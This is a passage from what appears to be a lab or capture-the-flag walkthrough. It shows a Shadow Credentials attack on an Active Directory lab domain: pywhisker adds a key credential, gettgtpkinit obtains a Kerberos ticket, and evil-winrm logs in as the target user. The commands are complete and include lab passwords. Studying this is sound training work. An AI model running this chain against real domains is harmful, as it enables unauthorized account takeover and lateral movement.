```text

```

## Linux cache

**Kali**

```bash
klist
```

On Linux, KRB5CCNAME can select a different cache. A ticket in one session is not automatically available in another.

<Accordion title="Flag 1 — Shadow Credentials → jpinkman">

### Flag 1 — Shadow Credentials → jpinkman

**Pass the Certificate: PKINIT and Lab Walkthrough**

```bash
# 1. write our key into jpinkman's msDS-KeyCredentialLink → get a PFX + its password
pywhisker --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' \
  --target jpinkman --action add
#   -> Saved PFX ... eFUVVTPf.pfx   |   Password: bmRH4LK7UwPrAOfvIx6W

# 2. PFX -> TGT as jpinkman
python3 gettgtpkinit.py -cert-pfx eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' \
  -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

# 3. Pass-the-Ticket -> WinRM in AS jpinkman (Kerberos)
export KRB5CCNAME=/tmp/jpinkman.ccache
klist                                   # Default principal: jpinkman@INLANEFREIGHT.LOCAL
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

</Accordion>
